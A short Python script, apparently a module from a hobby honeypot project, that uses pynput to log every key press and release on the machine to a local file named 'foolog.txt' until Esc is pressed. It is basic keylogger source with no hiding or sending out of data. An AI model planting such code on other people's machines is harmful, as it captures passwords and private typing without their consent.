from pynput import keyboard
from twisted.python import log
import sys
'''log.startLogging(sys.stderr)
log.startLogging(DailyLogFile.fromFullPath("D:\Python_Projects\HOneypot\Module\keyLogger\foo.log"))
'''


def on_press(key):
    print('Key {} pressed.'.format(key))
    sys.stdout = open('foolog.txt','a')
    

def on_release(key):
    print('Key {} released.'.format(key))
    sys.stdout = open('foolog.txt','a')
    if str(key) == 'Key.esc':
        print('Exiting...')
        return False

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()